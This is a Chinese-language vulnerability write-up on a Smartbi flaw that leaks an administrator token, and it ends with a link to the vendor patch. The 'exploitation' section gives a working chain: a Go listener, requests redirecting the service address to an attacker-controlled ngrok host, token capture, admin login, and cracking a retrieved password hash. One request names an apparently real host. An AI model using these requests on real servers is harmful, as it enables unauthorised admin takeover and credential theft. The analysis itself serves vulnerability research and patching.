---
created: 2024-09-30T02:30:00+00:00
categories:
  - 技术研究
tags:
  - 漏洞分析
updated: 2023-08-01T00:00:00+00:00
date: 2023-08-01T00:00:00+00:00
slug: smartbi-monitorservice-token-disclosure
title: Smartbi token泄漏致使任意登录漏洞分析
cover: https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/f158a7fe-22da-4d36-a9cf-c2a15c83d769/logged-in.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050157Z&X-Amz-Expires=3600&X-Amz-Signature=fd5c5a531dc78335c2c1c0b72ea371709a81888c8851b07efb4289279fcad6ed&X-Amz-SignedHeaders=host&x-id=GetObject
id: 111906e1-7468-8019-826d-fe56201d5edf
---

## 漏洞简介

Smartbi 是企业级商业智能和大数据分析平台，满足用户在企业级报表、数据可视化分析、自助探索分析、数据挖掘建模、AI 智能分析等大数据分析需求。

2023 年 7 月 28 日，Smartbi 官方发布安全补丁，修复了一处权限绕过漏洞。该漏洞源于监控服务中的接口对于未登录状态也提供访问，并且攻击者能够传递可控的服务器地址到其中的某些功能，这些功能会向攻击者可控的服务器泄漏 token，而这个 token 可被用来以管理员身份登录至后台。

## 影响版本

- Smartbi <= V10 && Smartbi != V9.5 && 安全补丁 < 2023-07-28

## 漏洞分析

### 补丁包解密

下载官方提供的补丁包文件`patch.patches`，使用 010 Editor 工具可以判断文件类型为 AES 加密文件。如下使用`cat`命令进行查看，也能够判断出来。

```shell
$ cat patch.patches
n0+aJMe4W7hs6xzxE5RvhGCv5LbOMBYCfDSLnX9o7/jd1kKJekz5mNTWkLQrvG6+qi7OwYAAOBbU
yhBYnFDbLuCShInJ9b/2YYktrClYvSbNVJwDAK+H/4+4yDfW9ugiUU7TLDwtIern5D+J8mQHliiw
jVATE0pMPUzFDxVbZR6lV3/pPI+NqkQ33F8Vs89sFA8rpPGhxaVzkbL+CW/D3pRV1+24ANb1I579
//jUkVteL+aJk8qYoBJz4w7PBxw2lFTedrrSzKZymhwISWdVo/oJwzF2BuX8ha+6QuOJ9uItzqNq
……
```

通过寻找，在 SmartbiX-AugmentedDataSet-0.0.1.jar 中的`smartbix.augmenteddataset.util`包中，存在`AESCryption`类，提供 AES 加解密功能。

```java
public final class AESCryption {
    private static String key = "1234567812345678";
    private static String iv = "1234567812345678";
    private static final String MODE = "AES/CBC/PKCS5Padding";

    private AESCryption() {
    }
    public static String encrypt(String data) {
        try {
            if (data == null) {
                return null;
            } else {
                Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
                SecretKeySpec keyspec = new SecretKeySpec(key.getBytes("utf-8"), "AES");
                IvParameterSpec ivspec = new IvParameterSpec(iv.getBytes("utf-8"));
                cipher.init(1, keyspec, ivspec);
                byte[] encrypted = cipher.doFinal(data.getBytes("UTF-8"));
                return Base64.encodeBase64String(encrypted).toString();
            }
        }
    }
    public static String decrypt(String encrypted) {
        try {
            if (encrypted == null) {
                return null;
            } else {
                byte[] encrypted1 = Base64.decodeBase64(encrypted);
                Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
                SecretKeySpec keyspec = new SecretKeySpec(key.getBytes("utf-8"), "AES");
                IvParameterSpec ivSpec = new IvParameterSpec(iv.getBytes("utf-8"));
                cipher.init(2, keyspec, ivSpec);
                byte[] original = cipher.doFinal(encrypted1);
                String originalString = new String(original, "utf-8");
                return originalString;
            }
        }
    }
}
```

那么，根据如上`key`和`iv`，编写 Python 解密脚本。

```python
import argparse
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from base64 import b64decode

def decrypt_aes_file(input_file, output_file, key=b'1234567812345678', iv=b'1234567812345678'):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    with open(input_file, 'rb') as f_in:
        encrypted_data = f_in.read()
        decoded_data = b64decode(encrypted_data)
        decrypted_data = unpad(cipher.decrypt(decoded_data), AES.block_size)
    with open(output_file, 'wb') as f_out:
        f_out.write(decrypted_data)

parser = argparse.ArgumentParser()
parser.add_argument('-f', '--file', type=str, default="patch.patches", help="Path to file name.")
args = parser.parse_args()

filename = "decrypted-"+args.file+".zip"

decrypt_aes_file(args.file, filename)
print("[+] OutPut: " + filename)
```

最终解密出来的是一个 zip 压缩包，直接进行解压后就可以看到补丁代码。

```shell
$ mv patch.patches 2023-07-28-patch.patches && python deSmartBIPatch.py -f 2023-07-28-patch.patches
[+] OutPut: decrypted-2023-07-28-patch.patches.zip
$ unzip decrypted-2023-07-28-patch.patches.zip && tree decrypted-2023-07-28-patch.patches
decrypted-2023-07-28-patch.patches
├── patch.patches
└── smartbi
    └── security
        └── patch
            └── impl
                ├── AdminsPatchRule.class
                ├── AdminsRMIServletPatchRule.class
                ├── AssertFunctionRMIServletPatchRule.class
                ├── BIConfigAdminsRMIServletPatchRule.class
                ├── ChoosePathPatchRule.class
                ├── ChoosePathRMIPatchRule.class
                ├── EscapeErrorDetailPatchRule.class
                ├── EscapeErrorDetailPatchRuleInternal$1.class
                ├── EscapeErrorDetailPatchRuleInternal.class
                ├── EscapeRefreshString$1$1.class
                ├── EscapeRefreshString$1.class
                ├── EscapeRefreshString.class
                ├── LimitGetSelfPassword.class
                ├── LimitGetSessionAttrPassword.class
                ├── ListSessionsPatchRule.class
                ├── RMIServletPatchRule.class
                ├── RejectPatchRule.class
                ├── RejectPatchRuleBy404.class
                ├── RejectRMIDataConnPatchRule.class
                ├── RejectRMIEncodeRule.class
                ├── RejectRMIParamsStringsPatchRule.class
                ├── RejectRMIPatchRule.class
                ├── RejectSmartbixSetAddress.class
                ├── RejectStubPostPatchRule.class
                ├── RemoveLog4j2JNDIPatchRule.class
                ├── RestrictIpPatchRule.class
                └── WindowUnLoadingAndAttributeRule.class
```

### 补丁代码分析

不断排查，定位到本次漏洞的补丁代码位于`RejectSmartbixSetAddress`类，相关代码如下。

```java
package smartbi.security.patch.impl;

public class RejectSmartbixSetAddress extends PatchRule {
    public int patch(HttpServletRequest request, HttpServletResponse response, FilterChain chain) throws IOException, ServletException {
        try {
            String tagName = getTagName();
            if (tagName.contains("SmartbiV95")) {
                return 0;
            }
            Class<?> clazz = Class.forName("smartbix.datamining.service.MonitorService");
            Method getToken = clazz.getDeclaredMethod("getToken", String.class);
            if (getToken == null) {
                return 0;
            }
            return 1;
        } catch (Exception e) {
            return 1;
        }
    }
}
```

如上代码先判断了版本号是否为 V95，如果是则返回 0，由此可见该版本不受该漏洞影响。然后继续判断`smartbix.datamining.service.MonitorService`类中是否存在`getToken`方法，如果不存在则返回 0，即不受该漏洞影响。

但若存在`getToken`方法则会返回 1，此时再来查看补丁包中的`patch.patches`日志更新文件，当`type`为`RejectSmartbixSetAddress`时，存在以下`url`，这些`url`将会被拒绝访问。

```json
"PATCH_20230728": {
	"desc": "修复在某种特定情况下破解用户密码和特定情况下DB2绕过判断执行命令漏洞 (Patch.20230728  @2023-07-28)",
	"urls": [
	{
		"url": "/smartbix/api/monitor/setServiceAddress",
		"rules": [{
			"type": "RejectSmartbixSetAddress"
		}]
	}, {
		"url": "/smartbix/api/monitor/setServiceAddress/",
		"rules": [{
			"type": "RejectSmartbixSetAddress"
		}]
	}, {
		"url": "/smartbix/api/monitor/setEngineAddress",
		"rules": [{
			"type": "RejectSmartbixSetAddress"
		}]
	}, {
		"url": "/smartbix/api/monitor/setEngineAddress/",
		"rules": [{
			"type": "RejectSmartbixSetAddress"
		}]
	}, {
		"url": "/smartbix/api/monitor/setEngineInfo",
		"rules": [{
			"type": "RejectSmartbixSetAddress"
		}]
	}, {
		"url": "/smartbix/api/monitor/setEngineInfo/",
		"rules": [{
			"type": "RejectSmartbixSetAddress"
		}]
	}]
}
```

### token 处理逻辑

根据如上补丁代码分析，首先进入到`smartbix.datamining.service.MonitorService`类中，该类位于 SmartbiX-DataMining-0.0.1.jar 文件。

找到`getToken`方法，注解`@FunctionPermission({"NOT_LOGIN_REQUIRED"})`可以表明`/token`接口能被未授权访问，同时由于`@RequestBody`注解的存在，该方法接收的内容类型不能为`application/x-www-form-urlencoded`。

```java
@RequestMapping(
    value = {"/token"},
    method = {RequestMethod.POST}
)
@FunctionPermission({"NOT_LOGIN_REQUIRED"})
public void getToken(@RequestBody String type) throws Exception {
    String token = this.catalogService.getToken(10800000L);
    ComponentStateHolder.toSmartbiX();
    if (StringUtil.isNullOrEmpty(token)) {
        throw SmartbiXException.create(CommonErrorCode.NULL_POINTER_ERROR).setDetail("token is null");
    } else if (!"SERVICE_NOT_STARTED".equals(token)) {
        Map<String, String> result = new HashMap();
        result.put("token", token);
        if ("experiment".equals(type)) {
            EngineApi.postJsonEngine(EngineUrl.ENGINE_TOKEN.name(), result, Map.class, new Object[0]);
        } else if ("service".equals(type)) {
            EngineApi.postJsonService(ServiceUrl.SERVICE_TOKEN.name(), result, Map.class, new Object[]{EngineApi.address("service-address")});
        }

        ComponentStateHolder.toSmartbiX();
        ComponentStateHolder.fromSmartbiX();
    }
}
```

如上`getToken`方法中，最初先生成了一个`token`字符串，跟进`catalogService.getToken`方法，其中又调用了`pushLoginTokenByEngine`方法来生成一个管理员用户的`token`。

该`token`不为空且不为字符串`SERVICE_NOT_STARTED`，顺利进入到如下`else if`分支，此时根据`type`值是为`"experiment"`还是`"service"`，存在两种情况。

```java
else if (!"SERVICE_NOT_STARTED".equals(token)) {
    Map<String, String> result = new HashMap();
    result.put("token", token);
    if ("experiment".equals(type)) {
        EngineApi.postJsonEngine(EngineUrl.ENGINE_TOKEN.name(), result, Map.class, new Object[0]);
    } else if ("service".equals(type)) {
        EngineApi.postJsonService(ServiceUrl.SERVICE_TOKEN.name(), result, Map.class, new Object[]{EngineApi.address("service-address")});
    }
```

它们接收的第一个参数值分别如下，差不多类似，取决于占位符。

```java
ENGINE_TOKEN("{0}/api/v1/configs/engine/smartbitoken")
SERVICE_TOKEN("%s/api/v1/configs/engine/smartbitoken")
```

`postJsonService`还会多传递了一个`EngineApi.address("service-address")`对象，`EngineApi.address`方法如下，当接收的值为`"service-address"`时会返回`"SERVICE_ADDRESS"`的值，该值最终会被传递到`postJsonService`方法中。

```java
public static String address(String type) {
    if (type.equals("engine-address")) {
        return SystemConfigService.getInstance().getValue("ENGINE_ADDRESS");
    } else if (type.equals("service-address")) {
        return SystemConfigService.getInstance().getValue("SERVICE_ADDRESS");
    } else {
        return type.equals("outside-schedule") ? SystemConfigService.getInstance().getValue("MINING_OUTSIDE_SCHEDULE") : "";
    }
}
```

分别查看`postJsonEngine`和`postJsonService`方法。在`postJsonEngine`方法中，`values`值为空，而在`postJsonService`方法中，`values`值为`"SERVICE_ADDRESS"`的值。还存在的差异就是`EngineUrl.getUrl`与`ServiceUrl.getUrl`方法的不同。

```java
public static <T> T postJsonEngine(String type, Object data, Class<T> dataType, Object... values) throws Exception {
    String url = EngineUrl.getUrl(type, values);
    return HttpKit.postJson(url, data, dataType);
}
public static <T> T postJsonService(String type, Object data, Class<T> dataType, Object... values) throws Exception {
    String url = ServiceUrl.getUrl(type, values);
    return HttpsKit.postJson(url, data, dataType);
}
```

在最后，它们都会向`getUrl`方法返回的`url`提交 POST 请求，body 为 JSON 类型来发送`token`值。

```java
return HttpsKit.postJson(url, data, dataType);

```

先进入到`EngineUrl.getUrl`方法中，虽然传入其中的`values`值将会为空，但在最后会将`EngineApi.address("engine-address")`作为`"{0}/api/v1/configs/engine/smartbitoken"`的占位符，根据如上的`address`方法能够知道该值为`"ENGINE_ADDRESS"`的值。

```java
public static String getUrl(String val, Object... values) {
    EngineUrl engineUrl = null;
    engineUrl = valueOf(val);
    if (engineUrl != null && engineUrl.url != null) {
        String url = engineUrl.url;
        url = String.format(url, values);
        if (url.contains("lang=")) {
            Locale currentLocale = LanguageHelper.getCurrentLocale();
            String language = currentLocale.toString();
            url = MessageFormat.format(url, EngineApi.address("engine-address"), language);
        } else {
            url = MessageFormat.format(url, EngineApi.address("engine-address"));
        }
        return url;
    }
}
```

同样的，进入`ServiceUrl.getUrl`方法，在其中，`values`也就是传进来的`"SERVICE_ADDRESS"`值会作为占位符，与`"%s/api/v1/configs/engine/smartbitoken"`进行拼接。

```java
public static String getUrl(String val, Object... values) {
    ServiceUrl serviceUrl = null;
    serviceUrl = valueOf(val);
    if (serviceUrl != null && serviceUrl.url != null) {
        String url = serviceUrl.url;
        url = String.format(url, values);
        if (url.contains("lang=")) {
            Locale currentLocale = LanguageHelper.getCurrentLocale();
            String language = currentLocale.toString();
            url = MessageFormat.format(url, language);
        }
        return url;
    }
}
```

两个`getUrl`方法返回的`url`差不多类似，意味着在`MonitorService.getToken`方法中，`type`值为`"experiment"`或`"service"`，都是差不多的，区别只在于`"ENGINE_ADDRESS"`与`"SERVICE_ADDRESS"`。

### 设置地址

如上分析，可以发现关键就在于`"ENGINE_ADDRESS"`或`"SERVICE_ADDRESS"`的值，需要是可控的。在补丁分析阶段，补丁日志更新文件中那些会被禁用的`url`，有`engine`、`service`、`addressd`的字眼。

```json
"PATCH_20230728": {
	"desc": "修复在某种特定情况下破解用户密码和特定情况下DB2绕过判断执行命令漏洞 (Patch.20230728  @2023-07-28)",
	"urls": [
	{
		"url": "/smartbix/api/monitor/setServiceAddress",
		"rules": [{
			"type": "RejectSmartbixSetAddress"
		}]
	}, {
		"url": "/smartbix/api/monitor/setEngineAddress",
		"rules": [{
			"type": "RejectSmartbixSetAddress"
		}]
	}]
}
```

挑其中之一进行分析，如`/smartbix/api/monitor/setServiceAddress`。根据`MonitorService`类中的`@RequestMapping`注解，该接口的处理方法如下，在其中恰恰就可以更新`"SERVICE_ADDRESS"`的值，将该值更改为攻击者自己可控的服务器地址，便可以接收到管理员 token，从而实现未授权后台登录。

```java
@RequestMapping(
    value = {"/setServiceAddress"},
    method = {RequestMethod.POST}
)
public ResponseModel setServiceAddress(@RequestBody String serviceAddress) {
    ResponseModel res = new ResponseModel();
    if (StringUtils.isBlank(serviceAddress)) {
        throw SmartbiXException.create(CommonErrorCode.ILLEGAL_PARAMETER_VALUES).setDetail("Service address cannot be empty");
    } else {
        this.systemConfigService.updateSystemConfig("SERVICE_ADDRESS", serviceAddress, NodeLanguage.getNodeLanguage("ServiceAddress"));
        res.setMessage("Service address updated successfully");
        return res.setTime();
    }
}
```

补丁日志更新文件中其他被禁用的`url`就不一一分析了，差别只在于请求路径有所不同。

### token 利用

`MonitorService`类中的`loginByToken`方法，会调用`catalogService.loginByToken`方法对传入的`token`进行判断。

```java
@RequestMapping(
    value = {"/login"},
    method = {RequestMethod.POST}
)
@FunctionPermission({"NOT_LOGIN_REQUIRED"})
public Map<String, Object> loginByToken(@RequestBody String token) {
    boolean isLogin = this.catalogService.loginByToken(token);
    ComponentStateHolder.toSmartbiX();
    Map<String, Object> result = new HashMap();
    result.put("result", isLogin);
    ComponentStateHolder.fromSmartbiX();
    return result;
}
```

而在`catalogService.loginByToken`方法中，它又调用了`userManagerModule.loginByToken`方法。

```java
public boolean loginByToken(String token) {
    if (StringUtil.isNullOrEmpty(token)) {
        return false;
    } else {
        String userName = null;
        UserLoginToken loginToken = (UserLoginToken)LoginTokenDAO.getInstance().load(token);
        if (loginToken != null) {
            if (loginToken.getCreateTime() != null && System.currentTimeMillis() - loginToken.getCreateTime().getTime() <= loginToken.getDuration()) {
                userName = loginToken.getUserName();
            } else {
                this.deleteLoginToken(loginToken);
            }
        }

        if (StringUtil.isNullOrEmpty(userName)) {
            return false;
        } else {
            IUser user = this.getCurrentUser();
            if (user == null || !this.isAdmin(user.getId())) {
                if (this.stateModule.getSystemId() == null) {
                    this.stateModule.setSystemId("DEFAULT_SYS");
                }

                this.stateModule.setCurrentUser(this.getUserById("SERVICE"));
            }

            if (loginToken != null && this.stateModule.getSession() != null) {
                String ext = loginToken.getExtended();
                JSONObject extended = StringUtil.isNullOrEmpty(ext) ? new JSONObject() : JSONObject.fromString(ext);
                extended.put("sessionId", this.stateModule.getSession().getId());
                loginToken.setExtended(extended.toString());
                LoginTokenDAO.getInstance().update(loginToken);
            }

            return this.switchUser(userName);
        }
    }
}
```

该方法用于通过`token`进行登录，它会根据传入的`token`从数据库中加载用户登录信息，判断`token`是否有效，并根据登录信息中的用户名来执行登录操作。同时，在登录过程中，会将会话 ID 加入到登录信息的扩展字段中，以便进行后续的会话管理。

## 漏洞利用

首先在自己服务器上起一个 HTTP 服务，当然也可以起在本地，利用某些内网穿透服务对外暴露本地 HTTP 服务来达到同样的效果。该 HTTP 服务将接收任意请求，均返回 200 状态码和 JSON 内容类型。

```go
package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
)

func main() {
	http.HandleFunc("/", handleRequest)
	fmt.Println("Server is running on *:8088")
	http.ListenAndServe(":8088", nil)
}

func handleRequest(w http.ResponseWriter, r *http.Request) {
	printHTTPRequest(r)
	w.WriteHeader(http.StatusOK)
	w.Header().Set("Content-Type", "application/json")
	response := map[string]string{"message": "Hello, this is a response in JSON!"}
	jsonResponse, _ := json.Marshal(response)
	w.Write(jsonResponse)
}

func printHTTPRequest(r *http.Request) {
	fmt.Println("--- Received HTTP Request ---")
	fmt.Printf("%s %s %s\n", r.Method, r.URL.String(), r.Proto)
	for key, value := range r.Header {
		fmt.Printf("%s: %s\n", key, value)
	}
	body, _ := io.ReadAll(r.Body)
	fmt.Printf("\n%s\n", body)
	fmt.Println("---------------------------")
}
```

向目标站点发送`"SERVICE_ADDRESS"`，注意`Content-Type`标头。

```text
POST /smartbi/smartbix/api/monitor/setServiceAddress HTTP/1.1
Host:
User-Agent: Mozilla/5.0
Connection: close
Content-Length: 40
Content-Type: text/plain
Accept-Encoding: gzip, deflate

<https://hz29-03-542-6-825.ngrok-free.app>
```

```text
HTTP/1.1 200
Server: nginx
Date: Wed, 02 Aug 2023 02:48:27 GMT
Content-Type: application/json
Content-Length: 85
Connection: close
Set-Cookie: smartbi_smartbi_sessionid=I8a8a86440188d7d8d7d84ba80189be868e412d09; Path=/smartbi; HttpOnly
Set-Cookie: JSESSIONID=9DAB60CE0FFEDC6475B6F1837BA6C3D5; Path=/smartbi; HttpOnly

{"took":2,"success":true,"message":"Service address updated successfully","code":200}
```

请求`/engineInfo`，可以查看刚刚设置的`serviceAddress`。

```text
POST /smartbi/smartbix/api/monitor/engineInfo HTTP/1.1
Host:
User-Agent: Mozilla/5.0
Connection: close
Content-Length: 0
Content-Type: text/plain
Accept-Encoding: gzip, deflate


```

```text
HTTP/1.1 200
Server: nginx
Date: Wed, 02 Aug 2023 02:58:37 GMT
Content-Type: application/json
Content-Length: 224
Connection: close
Set-Cookie: smartbi_smartbi_sessionid=I8a8a86440188d7d8d7d84ba80189be88dda52d11; Path=/smartbi; HttpOnly
Set-Cookie: JSESSIONID=CD64F807282B28163038F08D5783DFE9; Path=/smartbi; HttpOnly

{"took":0,"success":true,"message":"Operation successful","code":200,"entity":{"serviceAddress":"<https://hz29-03-542-6-825.ngrok-free.app>","engineAddress":"className=UserService\\u0026methodName=isLogged\\u0026params=%5B%5D"}}
```

接着，触发目标站点向我们可控的服务器发送 token。

```text
POST /smartbi/smartbix/api/monitor/token HTTP/1.1
Host:
User-Agent: Mozilla/5.0
Connection: close
Content-Length: 7
Content-Type: text/plain
Accept-Encoding: gzip, deflate

service
```

```text
HTTP/1.1 200
Server: nginx
Date: Wed, 02 Aug 2023 02:48:31 GMT
Content-Length: 0
Connection: close
Set-Cookie: smartbi_smartbi_sessionid=I8a8a86440188d7d8d7d84ba80189be86a23c2d0a; Path=/smartbi; HttpOnly
Set-Cookie: JSESSIONID=68897394A366E12C9C72BC8C12D57670; Path=/smartbi; HttpOnly


```

与此同时，观察服务器上接收到的 HTTP 报文。

```shell
$ go run main.go                                                                                          ∞ ∞
Server is running on *:8088
--- Received HTTP Request ---
POST /api/v1/configs/engine/smartbitoken HTTP/1.1
User-Agent: [Apache-HttpClient/4.5.13 (Java/1.8.0_201)]
Content-Length: [59]
Accept-Encoding: [gzip,deflate]
Content-Type: [application/json; charset=UTF-8]
X-Forwarded-For: [x.x.x.x]
X-Forwarded-Proto: [https]

{"token":"admin_I8a8a86440188d7d8d7d84ba80189be72528e2cfa"}
---------------------------
```

然后，就可以拿这个 token 去请求`/login` ，从而获得一个有效的 JSESSIONID。

```text
POST /smartbi/smartbix/api/monitor/login HTTP/1.1
Host:
User-Agent: Mozilla/5.0
Connection: close
Content-Length: 47
Content-Type: text/plain
Accept-Encoding: gzip, deflate

admin_I8a8a86440188d7d8d7d84ba80189be79a6532cff
```

```text
HTTP/1.1 200
Server: nginx
Date: Wed, 02 Aug 2023 03:06:56 GMT
Content-Type: application/json
Content-Length: 15
Connection: close
Set-Cookie: smartbi_smartbi_sessionid=I8a8a86440188d7d8d7d84ba80189be86d8f62d0d; Path=/smartbi; HttpOnly
Set-Cookie: JSESSIONID=31A219361B718184DBB129256068F050; Path=/smartbi; HttpOnly

{"result":true}
```

替换如下 Cookie 标头便能成功实现管理员用户登录。

```text
Cookie: smartbi_smartbi_sessionid=I8a8a86440188d7d8d7d84ba80189be86d8f62d0d; JSESSIONID=82214AE5A1234133379C4ED20E0A5CF8
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/2c01a18f-e8cf-4dca-bf3d-e7acba91b55d/logged-in.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=519d40dc40ea9ceb8f6256be96ea5cb64170eedf6ba249affbed0c8f01e5fc39&X-Amz-SignedHeaders=host&x-id=GetObject)

当然，还可以利用如上 Cookie 直接获取用户的密码，不过不是明文。

```text
POST /smartbi/vision/RMIServlet HTTP/1.1
Host: smartbi-test.miaozhen.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36
Connection: close
Cookie: smartbi_smartbi_sessionid=I8a8a86440188d7d8d7d84ba80189be86d8f62d0d; JSESSIONID=82214AE5A1234133379C4ED20E0A5CF8; CookieLanguageName=ZH-CN
Content-Length: 61
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate

className=UserService&methodName=getPassword&params=["admin"]
```

```text
HTTP/1.1 200
Server: nginx
Date: Wed, 02 Aug 2023 03:06:56 GMT
Content-Type: text/plain;charset=UTF-8
Content-Length: 71
Connection: close

{"retCode":0,"result":"0e6e061838856bf47e1de730719fb2609","duration":0}
```

如上响应中的`result`字段值，将其首位的`0`去掉就是一段 MD5 密文，解密后会发现是`admin@123`。

## 修复建议

目前厂商已发布安全补丁以修复这个安全问题，请通过如下链接下载安全补丁：

- [https://www.smartbi.com.cn/patchinfo](https://www.smartbi.com.cn/patchinfo)
